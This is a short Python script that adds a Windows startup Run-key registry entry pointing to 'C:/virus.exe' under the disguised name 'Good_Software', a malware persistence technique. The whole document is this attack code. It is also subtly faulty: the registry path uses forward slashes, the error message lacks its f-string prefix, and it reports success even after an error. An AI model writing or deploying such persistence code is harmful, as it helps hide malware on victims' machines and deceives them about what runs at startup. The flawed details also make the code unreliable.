import os
import winreg as winreg

# Specify the path to the program or file you want to run at startup
file_path = r"C:/virus.exe"

# Set the registry key path for startup programs
key_path = r"Software/Microsoft/Windows/CurrentVersion/Run"

# Define the name you want for your startup entry (it can be any string)
entry_name = "Good_Software"

try:
    # Open the registry key for writing
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as registry_key:
        winreg.SetValueEx(registry_key, entry_name, 0, winreg.REG_SZ, file_path)

    print(f"Added {entry_name} to startup with the path: {file_path}")
except Exception as e:
    error = "An error occurred: {e}"
    print(error)

print("Executed Successfully!!!")